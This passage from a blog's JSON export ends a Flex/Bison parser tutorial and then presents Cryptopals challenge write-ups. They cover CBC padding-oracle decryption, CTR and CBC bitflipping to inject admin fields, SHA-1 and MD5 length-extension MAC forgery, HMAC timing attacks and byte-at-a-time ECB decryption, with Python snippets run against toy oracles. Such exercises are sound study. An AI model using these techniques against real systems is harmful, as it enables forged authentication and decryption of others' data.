that in my union, I have a bunch of pointers of node types in my AST. I can now define %tokens, which are terminals in my grammar (strings, keywords and ints), and %types, which are nonterminals in my grammar. All the tokens are matched and returned in the .lex file. 123456%token&lt;intconst&gt; T_INT%token&lt;strType&gt; T_SEMICOLON T_LBRACKET T_RBRACKET T_LPAREN T_RPAREN T_AND T_OR T_EXCLAM T_LESS_THAN T_GREATER_THAN T_LEQ T_GEQ T_EQEQ T_PLUS T_MINUS T_TIMES T_DIV T_DOT T_EQUALS T_COLON T_LBRACE T_RBRACE T_COMMA%token &lt;strType&gt; T_FUNCTION T_GLOBAL T_IF T_ELSE T_WHILE T_RETURN T_NONE T_TRUE T_FALSE%token &lt;strType&gt; IDENTIFIER T_STRINGCONST And nonterminals: 1234567891011%type &lt;statementType&gt; stmt assignment callStmt ifStmt whileLoop returnStmt global Program%type &lt;blockType&gt; block%type&lt;stmtListType&gt; stmts%type &lt;expressionType&gt; expr call boolean function conjunction boolunit predicate arithmetic product unit lhs record constant subunit%type&lt;exprListType&gt; argument_expr_list func_declaration_list%type&lt;recordMapType&gt; record_init_list To enforce left-associativity, I add 12%left PLUS MINUS%left TIMES DIV Now for the fun stuff! With all the types I've defined, I need to write grammar rules for all of them. 12345678Program: %empty &#123; // printf(\"Empty program\\n\"); &#125; | stmts &#123; $$ = new Program(*$1); out = $$; &#125;; The highest level, the start Program, can be empty. We assign the Program node to out, which is passed to main.cpp through an argument of yyparse. Note that the skeleton code added some extra stuff to make this necessary/possible; namely, it is needed to make the parser reentrant. The skeleton code constructs are explained in this great post. Much of the translation from BNF grammar to Bison is straightforward. But, when creating variable-length lists, such as function arguments(fun(a b c){}), we have to use a C++ vector and recursively push objects into it. 1234567891011argument_expr_list: %empty &#123; $$ = new ExpressionList(); &#125; | expr &#123; $$ = new ExpressionList(); $$-&gt;push_back($1); &#125; | argument_expr_list T_COMMA expr &#123; $1-&gt;push_back($3); &#125;; In the third rule above, the $3 matches the expr, and $1 matches the argument_expr_list, which you recall is of type vector&lt;Expression*&gt;. The same goes for record rules, which are like Python dicts, and are of type map&lt;string, Expression*&gt;: 123456789101112131415record: T_LBRACE record_init_list T_RBRACE &#123; // printf(&quot;Parsing\\n &quot;); $$ = new Record(*$2); &#125;;record_init_list: %empty &#123; // printf(&quot;Parsing empty record\\n &quot;); $$ = new RecordMap(); &#125; | record_init_list IDENTIFIER T_COLON expr T_SEMICOLON &#123; // printf(&quot;Parsing record recursive\\n &quot;); $1-&gt;insert(make_pair(*$2, $4)); &#125;; Note that the default action for a rule is $$ = $1;. Running bison with bison --output=parser.cpp --defines=parser.h -v parser.yy will produce several files, including a parser.output file that contains valuable debugging info about our parser, such as the state transition tables. AST Nodes, Visitor pattern pretty-printing, and main (Or, putting it all together) Here's the main.cpp file 12345678910111213int main(int argc, char** argv)&#123; void* scanner; yylex_init(&amp;scanner); yyset_in(stdin, scanner); Statement* output; int rvalue = yyparse(scanner, output); if(rvalue == 1)&#123; cout&lt;&lt;\"Parsing failed\"&lt;&lt;endl; return 1; &#125; PrettyPrinter printer; output-&gt;accept(printer);&#125; Each class in my AST.h inherits from Expression or Statement. 123456789class Call: public Expression &#123;public: Expression&amp; targetExpr; ExpressionList&amp; argumentsList; Call( Expression&amp; targetExpr, ExpressionList&amp; argumentsList): targetExpr(targetExpr), argumentsList(argumentsList)&#123;&#125;; void accept(Visitor&amp; v) override &#123; v.visit(*this); &#125;&#125;; The accept function that overrides a virtual method is part of the Visitor Pattern. Instead of defining a pretty-print method in each of my classes in AST.h, I define a PrettyPrinter class that contains visit(Object&amp; obj) methods for all my nodes. We also need an interface with all our virtual methods in Visitor.h. This diagram explains the Visitor pattern well. My PrettyPrinter.h file has recursive calls to each node's accept() method. For example, for a Block, which contains a list of Statements, 123456789101112void visit(Block&amp; blk) override &#123; PrettyPrinter printer; printf(\"&#123;\"); TABLEVEL++; for ( auto statement = blk.statements.begin(); statement != blk.statements.end(); statement++ ) &#123; printf(\"\\n\"); (*statement)-&gt;accept(printer); &#125; printf(\"\\n%s&#125;\", string(TABLEVEL-1,'\\t').c_str()); TABLEVEL--;&#125;; I use a global variable TABLEVEL and printf(&quot;\\n%s}&quot;, string(TABLEVEL-1,'\\t').c_str()); to get the correct indentation for the body elements of the block. When I print, I wrap all BinaryExpressions and UnaryExpressions in parentheses. We can now understand the rest of our Makefile, 123456789all: parser.cpp lexer.cpp main.cpp PrettyPrinter.h Visitor.h g++ -g -std=gnu++11 main.cpp parser.cpp lexer.cppparser.cpp: parser.yy bison --output=parser.cpp --defines=parser.h -v parser.yylexer.cpp: lexer.lex flex --outfile=lexer.cpp --header-file=lexer.h lexer.lex The compiled binary, a.out, will take in a file through a redirect ./a.out &lt; tests/good1.mit and pretty-print! Other references Here is a complete compiler tutorial that is closer to a real language than most things. Most other Flex/Bison examples are stupid calculators x.x. This tutorial is very very thorough. The ANSI C Lex spec and Yacc (old version of Bison) file are helpful in constructing our own grammar and lex rules.","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]},{"title":"Matasano Crypto Challenges, Set 4","slug":"set4-writeup","date":"2017-03-07T15:38:11.000Z","updated":"2017-04-05T00:16:12.000Z","comments":true,"path":"2017/03/07/set4-writeup/","link":"","permalink":"http://raywang.tech/2017/03/07/set4-writeup/","excerpt":"","text":"Challenge 25 Break &quot;random access read/write&quot; AES CTR Because we can seek into the ciphertext and edit arbitrary characters, we we can simply guess each plaintext character. For each byte in the ciphertext, I can try all 256 characters by replacing the ciphertext byte with my encrypted guess using the provided edit() function. If the new ciphertext exactly matches the original ciphertext, then I know my guess for the plaintext character is correct, since it encrypted to the same byte. 123456for i in xrange(len(ciphertext)): for c in candidates: new_ciphertext = edit(ciphertext, i, c) if new_ciphertext[i] == ciphertext[i]: result += c &lt;!-- more --&gt; My main gripe is that this program is veryyy slow and I'm not sure where the slowdown comes from, but I'm not concerned with optimising right now. Challenge 26 CTR bitflipping CTR is susceptible to an even simpler bitflipping attack than CBC. I can simply send in the payload string as before '\\x00admin\\x00true\\x00', which will be inserted between &quot;&quot;comment1=cooking%20MCs;userdata=&quot; &quot; and &quot;;comment2=%20like%20a%20pound%20of%20bacon&quot; and encrypted. I can modify the ciphertext for the block-of-interest directly — I don't even need the previous ciphertext block as in CBC! 123ciphertext[32] = chr(ord(ciphertext[32]) ^ 59)ciphertext[38] = chr(ord(ciphertext[38]) ^ 61)ciphertext[43] = chr(ord(ciphertext[43]) ^ 59) will XOR in the ASCII codes for ; and =, so when CTR decryption XORs this ciphertext against the keystream, the desired characters will be left. Challenge 27 Recover the key from CBC with IV=Key Apparently, using the key as an IV is insecure, if an attacker can modify the ciphertext in-flight. The challenge instructs us to: 1234567891011Use your code to encrypt a message that is at least 3 blocks long:AES-CBC(P_1, P_2, P_3) -&gt; C_1, C_2, C_3Modify the message (you are now the attacker):C_1, C_2, C_3 -&gt; C_1, 0, C_1Decrypt the message (you are now the receiver) and raise the appropriate error if high-ASCII is found.As the attacker, recovering the plaintext from the error, extract the key:P'_1 XOR P'_3 Why does this work? Well, by inserting all \\x00's' in block 2, when we CBC decrypt block 3 of C', we recover the intermediate state of C_1, since we XOR with all \\x00. We also have the plaintext of C_1 in the first block. So, we can simply recover the IV by XORing the plaintext with the intermediate state. 123P'_3 ^ IV = P'_1IV = P'_1 ^ P'_3 Challenge 28 Implement a SHA-1 keyed MAC The way a MAC works is described in this diagram off wikipedia: We run the message through the HMAC algo, and send both the message and MAC digest to the receiver. The receiver must verify that the message he received has not been tampered by running it through the same MAC algo, and checking it against the MAC digest he received. In this case, our HMAC algo is just secret-prefix, SHA1(key || message). I borrow a SHA1 implementation from https://github.com/ajalt/python-sha1. The authsha1(key, data) function produces the MAC digest, and validate_oracle(key, message, digest) checks that the MAC digest of message matches digest. Challenge 29 Break a SHA-1 keyed MAC using length extension This is a cool attack. Here's a general idea of how SHA-1 works: SHA1 operates on padded data. The RFC explains the padding scheme as follows: The purpose of message padding is to make the total length of a padded message a multiple of 512. SHA-1 sequentially processes blocks of 512 bits when computing the message digest. '1' is appended to message. '0's are appended, depending on the original length of the message. Leave space for two 4-byte words at the end, so bring up the message to 448 bits (56 bytes). We can do that with 1message += b'\\x00' * ((56 - (message_byte_length + 1) % 64) % 64) If the message is already &gt;56, Append the 2-word representation of len(message). If the message is 40 bytes long, The two-word representation of 40 is hex 00000000 00000028. There are five internal state variables, h0, h1, h2, h3, h4. These are concatenated to give the final digest. The h's are initialized to 123450x67452301,0xEFCDAB89,0x98BADCFE,0x10325476,0xC3D2E1F0, Then, each chunk is processed and the h's are updated as follows: Split the 64-byte chunk into 16 4-byte words Populate a word_array of size 80 with the 16 words, and then 64 more generated values. Let A = H0, B = H1, C = H2, D = H3, E = H4. Do 80 rounds of transformations on a, b, c, d, e. Finally, update the internal digests H0 = H0 + A, H1 = H1 + B, H2 = H2 + C, H3 = H3 + D, H4 = H4 + E. So, when update() is called in authsha1, the internal states (the h's) are updated for every full 64-byte block, leaving the leftovers in self._unprocessed. Then, digest() is called, to pad the leftovers to 64 or 128 bytes, and do the last 1 or 2 internal state updates, returning the concatenated h's as the digest. The attack The attack will mean I am able to successfully append some data to the message and create a forged digest, such that the receiver will think that I generated the digest by knowing the key and accept the message as untampered. The steps for forging a digest are: I need to guess the length of the key so that my message will have the correct padding. Split the SHA1 digest of the true message into 5 pieces, which will be passed as h0, h1, h2, h3, h4 to a new SHA1. For each guess for the keylength, prepend key padding to the original message and append SHA1 padding. 12|keylen_guess|AAAAAAAAAAAAAA orig_message \\x01\\x00\\x00... Pass in the internal state variables and the length of the padded message to a new SHA1, telling the algorithm how many bytes have been processed so far(message_byte_length) and the current state. Update the SHA1 with the extension data, getting a forged digest. We're essentially forging the digest for: 12|keylen_guess|AAAAAAAAAAAAAA orig_message \\x01\\x00\\x00... ;admin=true Now, remove the key padding from the extended message, leaving the forged message: 1orig_message \\x01\\x00\\x00... ;admin=true . Send this and its forged digest to the receiver to be verified. The receiver will prepend the key to this message and calculate the digest. When we guess the correct keylen, the padding we've added to the orig_message block will be correct, and the SHA1 will continue by hashing the next block, ;admin=true, and find that the digest is the same as our forged one. 1234padded_plaintext_no_key = padded_plaintext_with_key_extension[keylen_guess:]if validate_oracle(key, padded_plaintext_no_key, forged_digest): print \"Found keylen_guess\", keylen_guess I successfully created a forged digest for the message comment1=cooking%20MCs;userdata=foo;comment2=%20like%20a%20pound%20of%20bacon\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98;admin=true that the receiver validates! Challenge 30 Break an MD4 MD5 keyed MAC using length extension I decided I like MD5 better than MD4, and there's more implementations out there. MD5 is susceptible to the same length extension attack as above because it follows the MD construction, which includes padding and the fact that the output of the hash gives all the state needed to continue, or extend, the hash. Here's how MD5 works: The padding scheme is very similar to SHA-1 — the only difference being that the length is added on as big-endian packed instead of little-endian packed. There are four internal state variables - A, B, C, D, each 32 bits. These are initialized to 1234word A: 01 23 45 67word B: 89 ab cd efword C: fe dc ba 98word D: 76 54 32 10 We also use a table of 64 values generated from the sine function, self.k. For each chunk, which is 512 bits, we unpack into 16 words of 32-bits. Then, we do 64 transforms, split into four rounds. each transform taking: an incrementing-by-one index into the sin table, a function f specific to the round, a lrot value, and an index into our array of 16 words. At the end of each transform, the ABCD values are updated as follows: 1a, b, c, d = d, x &amp; 0xffffffff, b, c where x is the result of the transform. The message digest produced as output is the concat of A, B, C, D, 128 bits, or 16-bytes in length. I use the implementation at https://github.com/FiloSottile/crypto.py/blob/master/2/md5.py, but it needs to be extended in several ways for this challenge. The implementation must allow the caller to set the internal state variables so that I can continue the hash. I add 12345678if state_array: self.A = state_array[0] self.B = state_array[1] self.C = state_array[2] self.D = state_array[3] else: #initial magic self.A, self.B, self.C, self.D = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) The implementation also must allow the caller to specify how many bytes have been processed so far, the message_byte_length option above. Challenge 31 Implement and break HMAC-SHA1 with an artificial timing leak I use Tornado as my web framework. I take in a file and signature URL param, and implement an insecure_compare function that converts the values to ascii, then byte-by-byte compares, adding a timing delay of 50ms. I iterate through all possible bytes, making a request with my known bytes + byte_guess + padding. I simply take the maximum delay each time, which would occur when I've guessed the byte correctly, causing another sleep of 50ms, for an added delay of 100ms. Challenge 32 Break HMAC-SHA1 with a slightly less artificial timing leak When I have such a small timing leak (5ms), network delays make the previous exploit unreliable. I need to normalize over multiple runs (I choose 10) to be able to tell whether the maximum is indeed the correct HMAC byte.","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Matasano Crypto Challenges, Set 1","slug":"set1_writeup","date":"2017-03-07T15:38:11.000Z","updated":"2017-03-11T07:37:34.000Z","comments":true,"path":"2017/03/07/set1_writeup/","link":"","permalink":"http://raywang.tech/2017/03/07/set1_writeup/","excerpt":"","text":"Challenge 1.1 Convert hex to base64 The first challenge is pretty straightforward, using python's built-in functions or pwntools, as I use heavily in these challenges. The functions a2b_hex, unhexlify, and ''.decode(&quot;hex&quot;) all do the same thing. They take in an ascii string of the form &quot;[0-9a-f]*&quot; and decode it. The string decodes to I'm killing your brain like a poisonous mushroom. We can then use binascii.b2a_base64() to convert the byte string to a base64 representation. &lt;!-- more --&gt; Challenge 1.2 Fixed XOR This challenge uses iterators to do a fixed-length xor. The chr() function takes an ASCII integer code in the range 0-255 and returns a character string. The ord() function does the inverse, taking a character and returning its integer. We want to xor these integers. Thus, ''.join([chr(ord(i)^ord(j)) for i, j in zip(s1, s2)]) will first xor the integers of each character of the input strings with ord(). Then it will convert back into a character string with chr(). Challenge 1.3 Single-byte XOR cipher Extending the last challenge, we can create a variable-length input xor function. Or, we can use pwntools xor(). I iterate through all 255 possible single character xor keys, scoring each decrypted word based on character frequency. 123456for c in result: c = c.lower() if c in character_frequency: word_score += character_frequency[c]cand_words.append((result, word_score, char)) Challenge 1.4 Detect single-character XOR This challenge asks us to find which of the 60-character strings in the file has been encrypted by single-character XOR. Using the find_singlechar_key_xor utility function created in the last challenge, I can iterate through all the file strings and find the possible single-character xor key and word score of each line. The line turns out to decode to 'Now that the party is jumping\\n', xored against the byte 5. Challenge 1.5 Implement repeating-key XOR This is a cop-out. Pwntools implements repeating-key xor in its utils.fiddling library. We can use python itertools for this as well, 1return ''.join([chr(ord(i)^ord(j)) for i, j in it.izip(s1, it.cycle(s2))]) Challenge 1.6 Break repeating-key XOR This challenge asks us to solve repeating-key xor, aka the Vigenere cipher. There are several steps to doing this. First, we need to find the xor key length. the period of the cipher. Next, we need to find the key character-by-character, using the single-byte xor cipher we made in Challenge 1.3. In the first step I calculate the Hamming distance (number of diff bits between two strings) of two consecutive ciphertext blocks (of some guessed length). The correct keylength will create blocks of minimum Hamming distance. The challenge tells us to try values from 2 to 40 for the guessed key length. I calculate the hamming distance of all combinations of 4 blocks. 12pairs = list(it.combinations(blocks, 2))hamsum = it.starmap(hamming, pairs) it.starmap computes the hamming function using arguments obtained from the iterable pairs. I then normalize the Hamming distance for keysize. 1normalized = float(reduce(lambda x, y: x+y, hamsum))/keysize and find the keylength with the minimum normalized hamming distance is 29. The second step is to find the key, character-by-character. I split the ciphertext into blocks of len(keysize) and transpose them, so that I have a list of all the 1st, 2nd, etc... chars of each block. Each of these transposed messages has been single-char xored, so I can just find each single-char key and concatenate the chars to get the full xor key. 12345678blocks = [x[i:i+keysize] for i in range(0, len(x), keysize)]blocks = it.izip_longest(*blocks, fillvalue='0')block_list = [''.join(msg) for msg in blocks]char_freqs = [find_singlechar_key_xor(''.join(msg))[2]for msg in block_list] I need to use izip_longest because the last block is shorter than the others, and izip_longest pads the shortest elements of the iterable. The key made by joining the single-char keys is Terminator X: Bring the noise. Challenge 1.7 AES in ECB mode This challenge introduces the AES block cipher and the ECB mode. The ECB mode is problematic because it is stateless and deterministic — the same block of plaintext will encrypt to the same ciphertext. I use the cryptography module in Python because it's being actively developed, although the PyCrypto library is more popular. You initialize AES, a symmetric cipher, with 1cipher = Cipher(algorithm = algorithms.AES(\"YELLOW SUBMARINE\"), mode = modes.ECB(), backend=default_backend()) . To decrypt text, you use a decryptor object and the update() and finalize() methods. 12d = cipher.decryptor()decrypted_text = d.update(file) + d.finalize() Challenge 1.8 Detect AES in ECB mode Because ECB is deterministic, I can detect which of the strings in 8.txt is encrypted using ECB. The properties of the plaintext, such as low Hamming distance, will remain in the ciphertext. Thus, I can use minimum Hamming distance to find the correct line, similar to Challenge 6. I create a scoring function, hamming_score_line(line), which will return the hamsum of a line of ciphertext. 1min_line_num = min(lines, key=hamming_score_line)[0] will be the correct answer, 133. References [1] pwntools","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Matasano Crypto Challenges, Set 2","slug":"set2_writeup","date":"2017-03-07T15:38:11.000Z","updated":"2017-04-23T06:30:01.000Z","comments":true,"path":"2017/03/07/set2_writeup/","link":"","permalink":"http://raywang.tech/2017/03/07/set2_writeup/","excerpt":"","text":"Challenge 9 Implement PKCS#7 padding As the challenge states, &quot;A block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.&quot; The PKCS#7 padding scheme will append the number of bytes of padding to the end of the block. I use the pwntools pack() function to pack the number of padding bytes. &lt;!-- more --&gt; Challenge 10 Implement CBC mode This challenge has us implement CBC mode of block encryption. In CBC mode, each block of plaintext is XORed with the previous ciphertext block before being encrypted. We need an IV for the first block of plaintext. In set2_utils, I create a CBC Cipher class that takes in a cipher and an IV. The encrypt() function will split the plaintext into blocks (usually size 16), and then do the encryption: 1234567# Xor with previous block. First prev_xor_block is the IV.pre_aes_block = xor(blocks[i], prev_xor_block)# Encrypt with cipher algorithmcurrent_cipher_block = e.update(pre_aes_block)prev_xor_block = current_cipher_blockciphertext += current_cipher_block The decryption takes each block of ciphertext, decrypts it, and XORs with the previous block of ciphertext to recover the plaintext. 12345for i in xrange(1, len(blocks)): decrypted_block = d.update(blocks[i]) # print decrypted_block plaintext += xor(decrypted_block, blocks[i-1]) # where blocks[i-1] is the previous ciphertext block I can verify I've done this correctly by decrypting 10.txt with a CBC Cipher with IV '\\x00'*16. Challenge 11 An ECB/CBC detection oracle This challenge asks us to detect whether we've encrypted a text with ECB or CBC, chosen at random. Recall the properties of ECB vs CBC — ECB will take two identical plaintext blocks and produce two identical ciphertext blocks. This is as simple as asking the oracle to encrypt a string that contains at least two consecutive blocks of identical characters. If the oracle chooses ECB, the ciphertext will have two adjacent identical blocks as well. To ensure that we have at least two consecutive blocks of identical characters, we need to input at least 43 bytes. Why? Because the oracle pads the plaintext with 5-10 bytes, so we need to give some offset to ensure our identical plaintext blocks are properly aligned. R = random_nfix 123|--------16-----||-5-| |---11----| |--------16----| |--------16----|RRRRR 00000000000 0000000000000000 0000000000000000 Challenge 12 Byte-at-a-time ECB decryption (Simple) I have an oracle that produces AES-128-ECB(your-string || unknown-string, random-key). I can find unknown-string with this oracle. The idea is that, First, I need to find the block size of the cipher. Then, assuming I know it's using ECB, I can find the flag byte-by-byte. How? Since I control my-string, I can ensure each time that the oracle encrypts 15 bytes that I know + one unknown byte. I can then create a table of all possible ciphertexts of the 15 known bytes + 1 unknown byte, and compare the ciphertext the oracle returns to the ciphertexts in my table. To find the block size, I feed in incrementing offsets to the oracle, until the ciphertext length increases. The size of the increase will be block_size, because of the padding. Next, I need to get an offset of 15 known bytes to feed into the oracle. The first offset is just 15 filler variables, all A's. 12345678U = unknown flag byteK = known flag byteInput to oracle, |-16-| bytes to be looked up in table: |----offset----| |--------16-----|plaintext: AAAAAAAAAAAAAAAU UUUU..... And I create a table of all possible ciphertexts of A...U. 1234for cand in candidates: # every candidate block of ciphertext is 16 bytes block_of_interest = oracle(offset+cand)[0:blocksize] cand_dict[block_of_interest] = cand I then feed the block with the unknown byte to the oracle, padding with the same filler variables as my offset. Perform the table lookup. 12345oracle_block = oracle('A'*offset_len)[block_of_interest : block_of_interest + blocksize]if oracle_block in cand_dict: next_byte = cand_dict[oracle_block] At the next iteration, I decrease the number of filler variables by 1, since I have a known byte and want the next byte. 123Input to oracle, |-16-| bytes to be looked up in table: |--------16-----|plaintext: AAAAAAAAAAAAAAKU UUUU..... When I have 16 known bytes in this manner, I no longer need filler variables in my offset; I can just use the previous 15 known bytes as my offset. Note that my lookup table can be populated with ciphertexts of 16 flag bytes. Since I have 16-byte ciphertexts in my lookup table, I need to first align, then get the index of, the 16-byte block-of-interest that I'll look up in my table. 123456Input to oracle, |-16-| bytes to be looked up in table:block_num: 0 1 block_of_interest alignment bytes |--------16-----|plaintext: AAAAAAAAAAAAAAAK KKKKKKKKKKKKKKKU UUUU..... Stopping after I run out of bytes, I find the answer is 1Rollin' in my 5.0\\nWith my rag-top down so my hair can blow\\nThe girlies on standby waving just to say hi\\nDid you stop? No, I just drove by\\n Challenge 13 ECB cut-and-paste Challenge 14 Byte-at-a-time ECB decryption with random prefix In this challenge, a random-length prefix is added to the attacker-controlled string, AES-128-ECB(random-prefix || attacker-controlled || target-bytes, random-key). Thus, I need to know the length of the prefix to be able to conduct the same attack as Challenge 12. Finding this length is not so hard. First, I can find the block index of the last byte of the prefix with just two calls to the oracle. Then, I find the offset of the last byte of the prefix within the last block. 12ciphertext1 = prefix_oracle('')ciphertext2 = prefix_oracle('A') Because this is ECB mode, the first different block between ciphertext1 and ciphertext2 will be the last block of the prefix. 12345678910U = unknown flag byteR = random prefix byteplaintext1:|--------16----||-enc to different value-|RRRRRRRRRRRRRRRRRRRRUUUUUU....plaintext2:|--------16----||-enc to different value-|RRRRRRRRRRRRRRRRRRRRAUUUUUU.... Now that I know what block the last byte of the prefix is in, find_prefix_block_modulo_offset finds the offset of the last byte of the prefix. I want to align two blocks of identical plaintext, to encrypt to two blocks of identical ciphertext. The amount of offset I use to align will tell me the offset of the prefix. 123for i in xrange(0, blocksize): offset = 'A'*i + '\\x00'*32 ciphertext = prefix_oracle(offset) 123456789 |--offset-|RRRRR00000000000 0000000000000000 0000000000000000 UUUUUU....```pythonIn the above example, the two 16-byte-aligned blocks of \\x00's will encrypt to adjacent identical ciphertext, which I can detect.Finally, `find_next_byte_with_prefix` will do the work. The offset is now```pythonoffset = 'A'*(extra_offset_for_prefix + offset_len) , with offset_len always being 15 known bytes, as in Challenge 12. The keys in my lookup table are no longer a fixed-length of blocksize — they include all known bytes now. Here, the len(offset) is not always 15, as in Challenge 12. Also, the length of my lookup table keys is not always blocksize; rather, the length of my keys increases with the number of known bytes. I could have implemented this more similarly to Challenge 12, which would have been less computationally expensive. How do I produce ciphertext keys for my lookup table now? Here's what I feed into the oracle: 12for cand in candidates: table_key = oracle(offset + knownbytes + cand)[prefix_location: prefix_location + len(offset) + len(knownbytes) + 1] 12 |--lookup table key---------|RRRRRAAAAAAAAAAA AAAAAAAAAAAAAAAU UUUU..... 123456 |-------------------lookup table key---------| |---offset-------|extra_offset_for_prefix | |RRRRRAAAAAAAAAAA AAAAAKKKKKKKKKKK KKKKKKKKKKKKKKKU UUUU..... Calling find_next_byte_with_prefix byte-by-byte, I find the same flag as before. 1Rollin' in my 5.0\\nWith my rag-top down so my hair can blow\\nThe girlies on standby waving just to say hi\\nDid you stop? No, I just drove by\\n Challenge 15 PKCS#7 padding validation Here's an easy one. We need only validate that the PKCS7 padding is correct. 123byte = s[-1]pad_length = unpack(byte, 'all')if byte == 0 or s[-pad_length:] != byte * pad_length or byte == \"\": I check if the last pad_length bytes of s are equal to the string of byte repeated pad_length times, as it should be in a properly padded string. Challenge 16 CBC bitflipping attacks We have a function that takes user input and url-encodes special characters, and we want to exploit the properties of CBC to allow us to insert the string &quot;;admin=true;&quot; without the &quot;;&quot; and &quot;=&quot; being validated out. Recall that CBC takes each block of ciphertext and XORs it with the next block of decrypted ciphertext to recover the plaintext. If I can modify at least two consecutive blocks of ciphertext, I can make the second block decrypt to whatever I want. I know that \\x00 ^ \\x59 = ; and \\x00 ^ \\x61 = '=' from ascii chart. 1234567891011user-controlled input: 0 1AAAAAAAAAAAAAAAA \\x00admin\\x00true\\x00ciphertext:XXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXmodified ciphertext:\\x59XXXXX\\x61XXXX\\x59XXXX XXXXXXXXXXXXXXXXIn XOR step of CBC decryption, the 2nd block would normally XOR to recover \\x00admin\\x00true\\x00, but now that I&apos;ve done an additional XOR on three bytes by modifying ciphertext, the 2nd block XORs to a plaintext of \\x59admin\\x61true\\x59. Done with set2!","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Matasano Crypto Challenges, Set 3","slug":"set3-writeup","date":"2017-03-07T15:38:11.000Z","updated":"2017-03-11T07:38:21.000Z","comments":true,"path":"2017/03/07/set3-writeup/","link":"","permalink":"http://raywang.tech/2017/03/07/set3-writeup/","excerpt":"","text":"Challenge 17 The CBC padding oracle!!!!! The CBC padding oracle is a very famous attack. We have an oracle function that takes in a ciphertext and decrypts it, returning True if the plaintext is padded properly. The process behind the attack on each block is: &lt;!-- more --&gt; For each byte, starting at the last position, modify the ciphertext in the previous block, cycling through all 256 possibilities for the plaintext until I find the correct one. Here's the explanation of how I make and check my guesses. For the currently examined block, remember that I can modify the previous block's ciphertext, which will be XORed with this block's intermediate state to get a modified plaintext. What is the goal for the modified plaintext? It's to get the proper padding bytes at the end of it! So, to decrypt the last byte of the block, I first provide the correct offset 123new_ciphertext, C':block -2 -1AAAAAAAAAAAAAAAZ XXXXXXXXXXXXXXXU If I cleverly choose the value of Z, then the last byte of C', U above, will XOR to the correct padding byte, \\x01. I XOR out the corresponding byte from the ciphertext, XOR out a guess for the flag byte character, and XOR in the desired padding byte (\\x01). 1pad_str = offset_pad + xor(prev_block[-desired_padding_byte], cand_ord, desired_padding_byte) I create the new_ciphertext C' by inserting my crafted block C[-2]' before the block I'm currently examining. 1new_ciphertext = ciphertext[:-32] + pad_str + ciphertext[-16:] If my guess is correct, then only \\x01 will be left, and padding_oracle(new_ciphertext) will return True. If I'm not examining the last character in the block, then the desired padding bytes will be something greater than \\x01. I modify the following ciphertext bytes I've already solved to XOR out the ciphertext byte, XOR out the known flag bytes, and XOR in the desired padding byte (\\x02 - \\xF). 1pad_str = pad_str + xor(prev_block[-desired_padding_byte+1:], known_last_bytes, desired_padding_byte) if len(known_last_bytes) &gt; 0 else pad_str As before, the correct guess will cause the byte of interest to XOR to the proper padding byte, and padding_oracle(new_ciphertext) will return True. 123new_ciphertext, C':block -2 -1AAAAAAAAAAAAAAZK XXXXXXXXXXXXXXUK Above, I want the plaintext bytes at positions UK to decrypt to \\x02\\x02. Modifying K to decrypt to \\x02 is simple because I already know the byte and can fully control what to XOR in or out. Note: The 'previous ciphertext' block for the first block is the IV, so we perform the XORs on it the same way we would modify any other block. The wrapper function, padding_oracle_attack(padding_oracle, ciphertext, blocksize), will loop through calls to decipher_block to find the last block, append the found bytes to the flag, and on the next iteration, slice out the blocks of ciphertext I've already solved. Challenge 18 This challenge is to implement CTR (Counter) stream cipher mode. CTR mode does not encrypt the plaintext — rather, it encrypts a running stream of counter bytes, which is then XORed with the plaintext. One benefit of CTR mode is that it does not require padding. I define a CTR() class in set3_utils. Decryption is identical to encryption. In encrypt, I generate the keystream, in 128 byte chunks, for all of my plaintext, which looks like 12keyblock = e.update(p64(self.nonce, 'little') + p64(self.counter, 'little'))keystream += keyblock These are pwntools packing functions, packing the counter in little-endian format. The nonce is a random, secret value that composes the first 64 bytes of every keystream block. After XORing my keystream with the plaintext, I save the unused keystream bytes in self.carry_over_bytes. The next time I run decrypt() or encrypt(), I set keystream = self.carry_over_bytes so I use all the bytes of previously-generated keystreams. Challenge 19 Break fixed-nonce CTR mode using substitutions Challenge 20 Break fixed-nonce CTR statistically In this challenge, using a fixed-nonce for CTR will essentially boil down to solving repeating-key XOR, where the repeating-key is the reused ciphertext of the CTR keystream. I know that each encrypted text has been XORed with the same keystream. I first pad each encrypted text with 0's to the same length (anything longer than the longest line). 1padded_encrypted_texts = [text.ljust(max_length, '0') for text in encrypted_texts] Then, I can simply concatenate all the ciphertexts into one long string, as if a repeating-xor-key of length max_length had been applied. 1keystream = breakRepeatingXor(\"\".join(padded_encrypted_texts), max_length) The result will be a keystream that, when XORed with each encrypted text, should produce mostly readable text. The accuracy towards the end of the longer strings will degrade, because there is not enough information to determine the correct key — there are simply not enough strings near the maximum length to determine the key based on letter frequency. Challenge 21 Implement the MT19937 Mersenne Twister RNG The Mersenne Twister is by far the most common PRNG (pseudo-random number generator). The most common version is based on the Mersenne prime 2&lt;sup&gt;19937&lt;/sup&gt;−1, and has a known set of constants and magic values. There are three main components of MT19937, 32-bit values. Initialization of the first set of 624 values from a seed Outputting the next number from the RNG, after some tempering Generating a new set of 624 values (twisting) In step 1, we initialize the self.state array by setting the first value to be the seed, and then calculating the rest from the formula off Wikipedia, x[i] = f × (x[i-1] ⊕ (x[i-1] &gt;&gt; (w-2))) + i, where w is the word size, 32 bits. 12for i in xrange(1, 624): 